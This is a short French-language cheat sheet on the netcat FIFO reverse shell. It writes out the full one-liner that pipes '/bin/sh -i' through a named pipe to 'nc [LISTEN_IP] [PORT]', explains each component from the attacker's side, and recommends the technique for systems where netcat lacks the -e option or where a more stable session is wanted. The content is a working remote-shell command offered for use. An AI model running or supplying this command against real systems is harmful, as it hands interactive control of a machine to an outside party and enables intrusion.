⚡ Reverse Shell Cheat Sheet : Netcat FIFO
Ce pense-bête résume la commande classique de reverse shell utilisant un Tube Nommé (FIFO), idéale lorsque l'option -e de Netcat n'est pas disponible (versions BSD/OpenBSD).

🎯 La Commande (Netcat + FIFO)
Utilisez cette commande pour établir une connexion sortante vers un listener à l'adresse [LISTEN_IP] sur le port [PORT].



rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [LISTEN_IP] [PORT] > /tmp/f




⚙️ Explication Étape par Étape
La commande crée un circuit bidirectionnel en reliant l'entrée et la sortie du shell à la connexion réseau.

Composant	Rôle	Description
rm /tmp/f	Nettoyage	S'assure qu'aucun ancien tube nommé n'existe.
mkfifo /tmp/f	Création du Tuyau	Crée le tube nommé (FIFO) utilisé pour le circuit.
cat /tmp/f	Entrée Shell	Lit les commandes qui seront écrites dans /tmp/f (provenant du réseau) et les canalise vers l'entrée (stdin) du shell.
`	/bin/sh -i`	Shell Interactif
2>&1	Redirection d'Erreur	Redirige les erreurs (stderr, descripteur 2) vers la même destination que la sortie standard (stdout, descripteur 1), assurant que les erreurs sont vues par l'attaquant.
`	nc ...`	Connexion Sortante
> /tmp/f	Sortie Réseau	Redirige tout ce que Netcat reçoit du réseau (les commandes tapées par l'attaquant) pour l'écrire dans le tube nommé /tmp/f.


Le Cas d'Usage Principal
La technique de reverse shell par tube nommé est utilisée dans les scénarios suivants :

1. 🚫 Netcat sans l'option -e (Sécurité/Portabilité)
C'est le cas le plus fréquent. De nombreuses distributions Linux modernes (basées sur Netcat OpenBSD) ne compilent pas l'option -e (-c ou --exec) car elle représente une fonctionnalité de sécurité jugée risquée (trop facile à utiliser pour créer des backdoors).

Quand nc -e échoue, l'approche mkfifo utilise des outils système de base (mkfifo, cat, |, >) qui sont toujours disponibles et compatibles avec toutes les versions de Netcat, garantissant ainsi l'exécution du shell inversé.

2. 🔀 Nécessité d'un Flux Bidirectionnel Robuste
Même dans les cas où nc -e est disponible, la technique mkfifo offre parfois une meilleure gestion des flux d'entrée et de sortie, car elle utilise le tube nommé (/tmp/f) comme une interface mémoire tampon entre le réseau et le shell, ce qui peut rendre le shell plus stable pour les sessions longues ou complexes.
